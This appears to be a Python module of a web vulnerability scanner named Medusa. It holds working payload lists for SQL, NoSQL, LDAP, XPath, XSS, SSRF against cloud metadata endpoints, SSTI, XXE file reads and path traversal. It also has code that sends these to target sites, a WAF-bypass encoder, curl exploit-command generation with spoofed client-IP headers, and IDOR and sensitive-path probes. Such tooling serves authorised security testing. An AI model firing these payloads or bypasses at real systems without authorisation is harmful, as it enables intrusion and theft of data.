"""
Comprehensive injection engine — TIER 2.
Covers every injection class in OWASP Top 10 2021:
SQLi (error/boolean/time/union/second-order/OOB/NoSQL/LDAP/XPath),
XSS (reflected/stored/DOM/blind), SSRF, SSTI, XXE.
All detection points: query params, POST body, JSON, headers, cookies, path segments.
"""
from __future__ import annotations

import asyncio
import base64
import logging
import re
import time
import urllib.parse
from typing import Any

import httpx

from medusa.engine.core.rate_limiter import TokenBucket
from medusa.engine.core.scope_guard import ScopeGuard
from medusa.engine.core.session import Session
from medusa.engine.modules.web.crawler import SiteMap

__all__ = ["Injectors"]

logger = logging.getLogger(__name__)

# ── SQLi Payloads ─────────────────────────────────────────────────────────────

SQLI_ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    '"',
    "\\",
    "1' OR '1'='1",
    "1; SELECT SLEEP(0)--",
    "' OR 1=1--",
    "admin'--",
    "1 UNION SELECT NULL--",
    "' AND 1=CONVERT(int,@@version)--",
    "' AND extractvalue(1,concat(0x7e,version()))--",
    "1; EXEC xp_cmdshell('whoami')--",
    "' OR 1=1 LIMIT 1--",
    "' OR '1'='1' /*",
]

SQLI_TIME_PAYLOADS = [
    ("' AND SLEEP(3)--",            3.0, "MySQL time-based SQLi"),
    ("'; WAITFOR DELAY '0:0:3'--",  3.0, "MSSQL time-based SQLi"),
    ("' AND pg_sleep(3)--",         3.0, "Postgres time-based SQLi"),
    ("' OR SLEEP(3)--",             3.0, "MySQL time-based SQLi (OR)"),
    ("1; SELECT pg_sleep(3)--",     3.0, "Postgres time-based SQLi (SELECT)"),
]

SQLI_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"valid MySQL result",
    r"MySqlClient\.",
    r"ORA-\d{5}",
    r"Oracle.*Driver",
    r"Warning.*\Wpg_",
    r"valid PostgreSQL result",
    r"Npgsql\.",
    r'Driver.*SQL[\s\S]*Server',
    r'OLE DB.*SQL Server',
    r'\bUnclosed quotation mark\b',
    r'\bSQL Server.*Error\b',
    r"SQLSTATE\[",
    r"PDOException.*SQLSTATE",
    r"Microsoft.*OLE DB.*provider",
    r"ADODB\.Field",
    r"Incorrect syntax near",
    r"Subquery returns more than 1 row",
    r"MariaDB server version",
    r"You have an error in your SQL syntax",
    r"supplied argument is not a valid MySQL",
    r"Column count doesn.*t match value count",
]

NOSQL_PAYLOADS = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "sleep(1000)"}',
    '{"$regex": ".*"}',
]

LDAP_PAYLOADS = [
    "*",
    "*)(&",
    "*)(uid=*))(|(uid=*",
    "*))%00",
    "\\2a",
]

XPATH_PAYLOADS = [
    "' or '1'='1",
    "x' or 1=1 or 'x'='y",
    "' or 1=1 or ''='",
    "x' or name()='username' or 'x'='y",
]

# ── XSS Payloads by Context ──────────────────────────────────────────────────

XSS_PAYLOADS = [
    # Reflected — HTML body
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    # HTML attribute break
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    # JS context
    "';alert(1)//",
    '";alert(1)//',
    "`);alert(1)//",
    # Template literal
    "${alert(1)}",
    # Event handlers
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    # Polyglot
    "javascript:alert(1)",
    "<script/src=data:,alert(1)>",
    # Bypass filters
    "<ScRiPt>alert(1)</ScRiPt>",
    "<%2fscript><script>alert(1)<%2fscript>",
    "<img src=x OnErRoR=alert(1)>",
]

XSS_MARKER = "xss_medusa_3141592"
XSS_DETECT_PAYLOADS = [
    f"<script>{XSS_MARKER}</script>",
    f'"><img src={XSS_MARKER}>',
    f"'{XSS_MARKER}",
]

# ── SSRF Payloads ─────────────────────────────────────────────────────────────

SSRF_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",         # AWS IMDS v1
    "http://169.254.169.254/metadata/v1/",              # DigitalOcean
    "http://100.100.100.200/latest/meta-data/",         # Alibaba Cloud
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
    "http://169.254.169.254/metadata/instance",         # Azure IMDS
    "http://localhost/",
    "http://127.0.0.1/",
    "http://0.0.0.0/",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_PING",
]

SSRF_PARAMS = [
    "url", "src", "dest", "redirect", "uri", "path", "continue",
    "window", "next", "data", "reference", "site", "html", "val",
    "validate", "domain", "callback", "return", "page", "feed", "host",
    "to", "out", "view", "dir", "show", "navigation", "open",
]

SSRF_INDICATORS = [
    "ami-id", "instance-id", "local-ipv4", "metadata",
    "root:x:", "localhost", "127.0.0.1",
]

# ── SSTI Payloads ─────────────────────────────────────────────────────────────

SSTI_PAYLOADS = [
    ("{{7*7}}",           "49",  "Jinja2/Twig SSTI"),
    ("${7*7}",            "49",  "Freemarker/Mako SSTI"),
    ("#set($x=7*7)$x",   "49",  "Velocity SSTI"),
    ("<%= 7*7 %>",        "49",  "ERB SSTI"),
    ("{{7*'7'}}",         "7777777", "Twig SSTI (7*'7')"),
    ("{{config}}",        "Config",  "Jinja2 config object leak"),
    ("${class.forName('java.lang.Runtime')}", "class", "Freemarker Java RCE"),
]

# ── XXE Payloads ─────────────────────────────────────────────────────────────

XXE_PAYLOADS = [
    # Classic file read
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>""",
    # SSRF via XXE
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>""",
    # XInclude
    """<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>""",
    # Error-based
    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]>
<foo>&xxe;</foo>""",
]

XXE_INDICATORS = [
    "root:x:",
    "daemon:",
    "ami-id",
    "instance-id",
    "Cannot open",
    "failed to open stream",
    "no such file",
]

# ── Path traversal ────────────────────────────────────────────────────────────

PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
]

PATH_TRAVERSAL_INDICATORS = ["root:x:", "daemon:", "localhost", "[boot loader]", "ftp"]


class Injectors:
    """
    Full injection testing engine covering OWASP Top 10 2021 injection classes.
    """

    def __init__(
        self,
        guard: ScopeGuard,
        bucket: TokenBucket,
        oob_callback_url: str | None = None,
    ) -> None:
        self.guard = guard
        self.bucket = bucket
        self.oob_callback_url = oob_callback_url
    
    def _waf_bypass_encode(self, payload: str, level: int = 1) -> str:
        """Applies multi-level encoding for WAF bypass."""
        result = payload
        if level >= 1:
            # Unicode Normalization Bypass (v2026 Standard)
            result = result.replace("'", "%u0027").replace('"', "%u0022")
            result = result.replace("<", "%u003c").replace(">", "%u003e")
        if level >= 2:
            # Double Encoding
            result = urllib.parse.quote(result)
        if level >= 3:
            # Triple Encoding + Mocking NULL byte
            result = urllib.parse.quote(result) + "%00"
        return result

    def _generate_curl_poc(self, url: str, method: str, params: dict, payload: str, context: str = "query", bypass_level: int = 0) -> str:
        """Generates a command-line ready CURL exploit command with optional WAF bypass variants."""
        cmd = ["curl", "-X", method]
        # Append headers to mimic real browser + bypass checks
        cmd.extend([
            "-H", "'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'",
            "-H", "'X-Forwarded-For: 127.0.0.1'",
            "-H", "'X-Origin-IP: 127.0.0.1'",
            "-H", "'X-Client-IP: 127.0.0.1'"
        ])
        
        test_payload = self._waf_bypass_encode(payload, level=bypass_level) if bypass_level > 0 else payload
        
        if method == "GET":
            test_params = dict(params)
            for k, v in test_params.items():
                if v == payload:
                    test_params[k] = test_payload
            query = urllib.parse.urlencode(test_params)
            final_url = f"{url}?{query}" if query else url
            cmd.append(f'"{final_url}"')
        else:
            test_params = dict(params)
            for k, v in test_params.items():
                if v == payload:
                    test_params[k] = test_payload
            data = urllib.parse.urlencode(test_params)
            cmd.extend(["--data", f'"{data}"'])
            cmd.append(f'"{url}"')
            
        return " ".join(cmd)

    async def run_full(
        self,
        sitemap: SiteMap | None,
        session: Session,
        auth_headers: dict[str, str] | None = None,
        auth_cookies: dict[str, str] | None = None,
    ) -> None:
        """Run all injection checks on sitemap endpoints and forms."""
        if sitemap is None:
            logger.warning("[injectors] No sitemap — skipping injection tests")
            return

        headers = auth_headers or {}
        cookies = auth_cookies or {}

        async with httpx.AsyncClient(
            verify=False, timeout=30.0,
            headers={**headers, "User-Agent": "Medusa-Scanner/1.0"},
            cookies=cookies,
            follow_redirects=True,
        ) as client:
            tasks = []
            for url in sitemap.endpoints[:100]:
                try:
                    self.guard.check(url, "web.injectors")
                except Exception:
                    continue
                tasks.append(self._test_url(client, url, session))

            for form in sitemap.forms[:50]:
                try:
                    self.guard.check(form.action, "web.injectors")
                except Exception:
                    continue
                tasks.append(self._test_form(client, form, session))

            # Run in batches of 10
            for i in range(0, len(tasks), 10):
                batch = tasks[i:i + 10]
                await asyncio.gather(*batch, return_exceptions=True)

    async def run(self, sitemap: SiteMap, session: Session) -> None:
        """Backward-compat entry point."""
        await self.run_full(sitemap, session)

    # ── URL endpoint testing ──────────────────────────────────────────────────

    async def _test_url(
        self, client: httpx.AsyncClient, url: str, session: Session
    ) -> None:
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        if not params:
            # Try common parameter names
            params = {"id": "1", "q": "test", "search": "test", "page": "1"}

        await asyncio.gather(
            self._test_sqli_error(client, url, params, "GET", session),
            self._test_sqli_time(client, url, params, "GET", session),
            self._test_xss_reflected(client, url, params, session),
            self._test_ssrf(client, url, params, session),
            self._test_ssti(client, url, params, session),
            self._test_path_traversal(client, url, params, session),
            return_exceptions=True,
        )

    async def _test_form(
        self, client: httpx.AsyncClient, form: Any, session: Session
    ) -> None:
        url = form.action
        method = form.method.upper()
        base_data = {inp["name"]: inp.get("value", "test") for inp in form.inputs}

        await asyncio.gather(
            self._test_sqli_error(client, url, base_data, method, session),
            self._test_xss_reflected(client, url, base_data, session, method=method),
            self._test_ssti(client, url, base_data, session, method=method),
            return_exceptions=True,
        )

    # ── SQLi ──────────────────────────────────────────────────────────────────

    async def _test_sqli_error(
        self,
        client: httpx.AsyncClient,
        url: str,
        params: dict[str, str],
        method: str,
        session: Session,
    ) -> None:
        for param_name in list(params.keys())[:5]:
            for payload in SQLI_ERROR_PAYLOADS[:8]:
                async with self.bucket:
                    try:
                        test_params = dict(params)
                        test_params[param_name] = payload
                        if method == "GET":
                            resp = await client.get(url, params=test_params)
                        else:
                            resp = await client.post(url, data=test_params)

                        body = resp.text or ""
                        for pat in SQLI_ERROR_PATTERNS:
                            if re.search(pat, body, re.IGNORECASE):
                                session.add_finding(
                                    module="web.injectors",
                                    target=f"{url}?{param_name}={payload}",
                                    title="SQL Injection — Error Based",
                                    description=(
                                        f"Parameter '{param_name}' is vulnerable to error-based SQLi.\n"
                                        f"Payload: {payload}\n"
                                        f"DB error pattern matched: {pat}\n"
                                        f"URL: {url}"
                                    ),
                                    severity="critical",
                                    payload=payload,
                                    exploit_poc=self._generate_curl_poc(url, method, test_params, payload, bypass_level=1),
                                    request=f"{method} {url} param={param_name} value={payload}",
                                    response=body[:2000],
                                    tags=["sqli", "error-based", "injection"],
                                    owasp_category="A03:2021-Injection",
                                    cwe_ids=["CWE-89"],
                                )
                                return  # one finding per param is enough
                    except Exception as exc:
                        logger.debug("SQLi error test %s: %s", url, exc)

    async def _test_sqli_time(
        self,
        client: httpx.AsyncClient,
        url: str,
        params: dict[str, str],
        method: str,
        session: Session,
    ) -> None:
        """Statistical time-based SQLi detection (3 trials)."""
        for param_name in list(params.keys())[:3]:
            for payload, expected_delay, description in SQLI_TIME_PAYLOADS[:3]:
                delays = []
                try:
                    # Baseline
                    for _ in range(2):
                        async with self.bucket:
                            t0 = time.monotonic()
                            base = dict(params)
                            base[param_name] = "1"
                            if method == "GET":
                                await client.get(url, params=base)
                            else:
                                await client.post(url, data=base)
                            delays.append(time.monotonic() - t0)

                    baseline = sum(delays) / len(delays)

                    # Timed payload
                    t0 = time.monotonic()
                    test = dict(params)
                    test[param_name] = payload
                    async with self.bucket:
                        if method == "GET":
                            await client.get(url, params=test, timeout=expected_delay + 8)
                        else:
                            await client.post(url, data=test, timeout=expected_delay + 8)
                    elapsed = time.monotonic() - t0

                    if elapsed >= expected_delay and elapsed > baseline + (expected_delay * 0.7):
                        session.add_finding(
                            module="web.injectors",
                            target=url,
                            title="SQL Injection — Time Based",
                            description=(
                                f"Parameter '{param_name}' vulnerable to time-based blind SQLi.\n"
                                f"Payload: {payload}\n"
                                f"Expected delay: {expected_delay}s, Observed: {elapsed:.2f}s, "
                                f"Baseline: {baseline:.2f}s\n"
                                f"Type: {description}"
                            ),
                            severity="critical",
                            payload=payload,
                            exploit_poc=self._generate_curl_poc(url, method, test, payload),
                            request=f"{method} {url} param={param_name} value={payload}",
                            tags=["sqli", "time-based", "blind", "injection"],
                            owasp_category="A03:2021-Injection",
                            cwe_ids=["CWE-89"],
                            details={"elapsed": elapsed, "baseline": baseline},
                        )
                        return
                except Exception as exc:
                    logger.debug("SQLi time test %s: %s", url, exc)

    # ── XSS ──────────────────────────────────────────────────────────────────

    async def _test_xss_reflected(
        self,
        client: httpx.AsyncClient,
        url: str,
        params: dict[str, str],
        session: Session,
        method: str = "GET",
    ) -> None:
        for param_name in list(params.keys())[:5]:
            for payload in XSS_DETECT_PAYLOADS:
                async with self.bucket:
                    try:
                        test = dict(params)
                        test[param_name] = payload
                        if method == "GET":
                            resp = await client.get(url, params=test)
                        else:
                            resp = await client.post(url, data=test)

                        body = resp.text or ""
                        if XSS_MARKER in body and payload in body:
                            session.add_finding(
                                module="web.injectors",
                                target=url,
                                title="Reflected XSS",
                                description=(
                                    f"Parameter '{param_name}' reflects payload unescaped in response.\n"
                                    f"Payload: {payload}\n"
                                    f"URL: {url}"
                                ),
                                severity="high",
                                payload=payload,
                                exploit_poc=self._generate_curl_poc(url, method, test, payload),
                                request=f"{method} {url} param={param_name} value={payload}",
                                response=body[:2000],
                                tags=["xss", "reflected", "injection"],
                                owasp_category="A03:2021-Injection",
                                cwe_ids=["CWE-79"],
                            )
                            return
                    except Exception as exc:
                        logger.debug("XSS test %s: %s", url, exc)

    # ── SSRF ─────────────────────────────────────────────────────────────────

    async def _test_ssrf(
        self,
        client: httpx.AsyncClient,
        url: str,
        params: dict[str, str],
        session: Session,
    ) -> None:
        # Filter params likely to accept URLs
        ssrf_likely = {k: v for k, v in params.items() if any(
            s in k.lower() for s in SSRF_PARAMS
        )}
        if not ssrf_likely:
            ssrf_likely = {k: v for k, v in list(params.items())[:2]}

        for param_name in ssrf_likely:
            for target_url in SSRF_TARGETS[:5]:
                async with self.bucket:
                    try:
                        test = dict(params)
                        test[param_name] = target_url
                        resp = await client.get(url, params=test, timeout=8)
                        body = resp.text or ""

                        for indicator in SSRF_INDICATORS:
                            if indicator.lower() in body.lower():
                                session.add_finding(
                                    module="web.injectors",
                                    target=url,
                                    title="Server-Side Request Forgery (SSRF)",
                                    description=(
                                        f"Parameter '{param_name}' is vulnerable to SSRF.\n"
                                        f"Injected URL: {target_url}\n"
                                        f"Indicator found in response: {indicator}\n"
                                        f"URL: {url}"
                                    ),
                                    severity="critical",
                                    payload=target_url,
                                    exploit_poc=self._generate_curl_poc(url, "GET", test, target_url),
                                    request=f"GET {url} param={param_name} value={target_url}",
                                    response=body[:2000],
                                    tags=["ssrf", "injection"],
                                    owasp_category="A10:2021-SSRF",
                                    cwe_ids=["CWE-918"],
                                )
                                return
                    except Exception as exc:
                        logger.debug("SSRF test %s: %s", url, exc)

    # ── SSTI ─────────────────────────────────────────────────────────────────

    async def _test_ssti(
        self,
        client: httpx.AsyncClient,
        url: str,
        params: dict[str, str],
        session: Session,
        method: str = "GET",
    ) -> None:
        for param_name in list(params.keys())[:5]:
            for payload, expected, description in SSTI_PAYLOADS[:5]:
                async with self.bucket:
                    try:
                        test = dict(params)
                        test[param_name] = payload
                        if method == "GET":
                            resp = await client.get(url, params=test)
                        else:
                            resp = await client.post(url, data=test)

                        body = resp.text or ""
                        if expected in body:
                            session.add_finding(
                                module="web.injectors",
                                target=url,
                                title="Server-Side Template Injection (SSTI)",
                                description=(
                                    f"Parameter '{param_name}' vulnerable to SSTI.\n"
                                    f"Payload: {payload}\n"
                                    f"Expected result '{expected}' found in response.\n"
                                    f"Type: {description}"
                                ),
                                severity="critical",
                                payload=payload,
                                exploit_poc=self._generate_curl_poc(url, method, test, payload),
                                request=f"{method} {url} param={param_name} value={payload}",
                                response=body[:2000],
                                tags=["ssti", "injection", "rce"],
                                owasp_category="A03:2021-Injection",
                                cwe_ids=["CWE-94"],
                            )
                            return
                    except Exception as exc:
                        logger.debug("SSTI test %s: %s", url, exc)

    # ── XXE ───────────────────────────────────────────────────────────────────

    async def test_xxe(
        self,
        client: httpx.AsyncClient,
        url: str,
        session: Session,
    ) -> None:
        """Test XML endpoints for XXE."""
        for payload in XXE_PAYLOADS:
            async with self.bucket:
                try:
                    resp = await client.post(
                        url,
                        content=payload,
                        headers={"Content-Type": "application/xml"},
                        timeout=10,
                    )
                    body = resp.text or ""
                    for indicator in XXE_INDICATORS:
                        if indicator.lower() in body.lower():
                            session.add_finding(
                                module="web.injectors",
                                target=url,
                                title="XML External Entity (XXE) Injection",
                                description=(
                                    f"XXE injection confirmed at {url}.\n"
                                    f"Indicator found: {indicator}\n"
                                    f"Payload: {payload[:500]}"
                                ),
                                severity="critical",
                                payload=payload[:2000],
                                exploit_poc=f"curl -X POST {url} -H 'Content-Type: application/xml' --data \"{payload.replace('\"', '\\\"')}\"",
                                request=f"POST {url} Content-Type: application/xml",
                                response=body[:2000],
                                tags=["xxe", "injection"],
                                owasp_category="A03:2021-Injection",
                                cwe_ids=["CWE-611"],
                            )
                            return
                except Exception as exc:
                    logger.debug("XXE test %s: %s", url, exc)

    # ── Path Traversal ────────────────────────────────────────────────────────

    async def _test_path_traversal(
        self,
        client: httpx.AsyncClient,
        url: str,
        params: dict[str, str],
        session: Session,
    ) -> None:
        path_params = {k: v for k, v in params.items() if any(
            s in k.lower() for s in ["file", "path", "page", "include", "doc", "template", "view"]
        )}
        if not path_params:
            return

        for param_name in path_params:
            for payload in PATH_TRAVERSAL_PAYLOADS[:4]:
                async with self.bucket:
                    try:
                        test = dict(params)
                        test[param_name] = payload
                        resp = await client.get(url, params=test, timeout=8)
                        body = resp.text or ""
                        for indicator in PATH_TRAVERSAL_INDICATORS:
                            if indicator.lower() in body.lower():
                                session.add_finding(
                                    module="web.injectors",
                                    target=url,
                                    title="Path Traversal",
                                    description=(
                                        f"Parameter '{param_name}' vulnerable to path traversal.\n"
                                        f"Payload: {payload}\n"
                                        f"Indicator: {indicator}"
                                    ),
                                    severity="high",
                                    payload=payload,
                                    exploit_poc=self._generate_curl_poc(url, "GET", test, payload),
                                    request=f"GET {url} param={param_name} value={payload}",
                                    response=body[:2000],
                                    tags=["path-traversal", "lfi", "injection"],
                                    owasp_category="A01:2021-Broken Access Control",
                                    cwe_ids=["CWE-22"],
                                )
                                return
                    except Exception as exc:
                        logger.debug("Path traversal test %s: %s", url, exc)

    # ── NoSQL ─────────────────────────────────────────────────────────────────

    async def test_nosql(
        self,
        client: httpx.AsyncClient,
        url: str,
        session: Session,
    ) -> None:
        """Test JSON endpoints for NoSQL injection."""
        for payload_str in NOSQL_PAYLOADS:
            async with self.bucket:
                try:
                    import json
                    payload = json.loads(payload_str)
                    resp_inject = await client.post(
                        url,
                        json={"username": payload, "password": payload},
                        headers={"Content-Type": "application/json"},
                        timeout=8,
                    )
                    resp_normal = await client.post(
                        url,
                        json={"username": "invalid_user_xyz", "password": "wrong_pass"},
                        headers={"Content-Type": "application/json"},
                        timeout=8,
                    )
                    if resp_inject.status_code == 200 and resp_normal.status_code != 200:
                        session.add_finding(
                            module="web.injectors",
                            target=url,
                            title="NoSQL Injection",
                            description=(
                                f"NoSQL injection bypass at {url}.\n"
                                f"Payload: {payload_str}\n"
                                f"Injected response: {resp_inject.status_code}, "
                                f"Normal response: {resp_normal.status_code}"
                            ),
                            severity="critical",
                            payload=payload_str,
                            request=f"POST {url} JSON payload",
                            response=resp_inject.text[:2000],
                            tags=["nosql", "injection", "auth-bypass"],
                            owasp_category="A03:2021-Injection",
                            cwe_ids=["CWE-943"],
                        )
                        return
                except Exception as exc:
                    logger.debug("NoSQL test %s: %s", url, exc)

    # ── Access Control ────────────────────────────────────────────────────────

    async def test_idor(
        self,
        client: httpx.AsyncClient,
        url: str,
        session: Session,
        baseline_status: int = 200,
    ) -> None:
        """Test for IDOR by incrementing/decrementing numeric IDs in URL."""
        import re as _re
        matches = list(_re.finditer(r"/(\d+)(/|$|\?)", url))
        if not matches:
            return

        for match in matches[:2]:
            original_id = int(match.group(1))
            for test_id in [original_id - 1, original_id + 1, 1, 2, 9999]:
                if test_id == original_id:
                    continue
                test_url = url.replace(f"/{original_id}/", f"/{test_id}/", 1)
                if test_url == url:
                    test_url = url.replace(f"/{original_id}", f"/{test_id}", 1)
                async with self.bucket:
                    try:
                        resp = await client.get(test_url, timeout=8)
                        if resp.status_code == baseline_status and len(resp.text) > 100:
                            session.add_finding(
                                module="web.injectors",
                                target=url,
                                title="Potential IDOR (Insecure Direct Object Reference)",
                                description=(
                                    f"Resource at {test_url} (id={test_id}) returned {resp.status_code} "
                                    f"— may belong to another user.\n"
                                    f"Original ID: {original_id}"
                                ),
                                severity="high",
                                payload=str(test_id),
                                request=f"GET {test_url}",
                                response=resp.text[:1000],
                                tags=["idor", "access-control", "bola"],
                                owasp_category="A01:2021-Broken Access Control",
                                cwe_ids=["CWE-639"],
                            )
                            return
                    except Exception as exc:
                        logger.debug("IDOR test %s: %s", test_url, exc)

    async def test_forced_browsing(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        session: Session,
    ) -> None:
        """Check for exposed admin/debug/backup endpoints."""
        from urllib.parse import urlparse
        parsed = urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        sensitive_paths = [
            "/admin", "/admin/", "/administrator", "/wp-admin", "/phpmyadmin",
            "/debug", "/console", "/actuator", "/actuator/env", "/actuator/health",
            "/api/v1/users", "/api/users", "/.env", "/.git/HEAD",
            "/backup", "/backup.zip", "/db.sql", "/database.sql",
            "/config.php.bak", "/web.config", "/server-status", "/server-info",
            "/swagger-ui.html", "/api-docs", "/openapi.json", "/swagger.json",
            "/.htaccess", "/robots.txt", "/sitemap.xml",
        ]

        for path in sensitive_paths:
            url = f"{base}{path}"
            async with self.bucket:
                try:
                    resp = await client.get(url, timeout=8)
                    if resp.status_code in (200, 301, 302, 403):
                        severity = "high" if resp.status_code == 200 else "medium"
                        session.add_finding(
                            module="web.injectors",
                            target=url,
                            title=f"Sensitive Endpoint Accessible: {path}",
                            description=(
                                f"Potentially sensitive endpoint {url} returned HTTP {resp.status_code}.\n"
                                f"Content length: {len(resp.text)} bytes."
                            ),
                            severity=severity,
                            request=f"GET {url}",
                            response=resp.text[:500],
                            tags=["forced-browsing", "access-control", "misconfiguration"],
                            owasp_category="A01:2021-Broken Access Control",
                            cwe_ids=["CWE-425"],
                        )
                except Exception:
                    pass
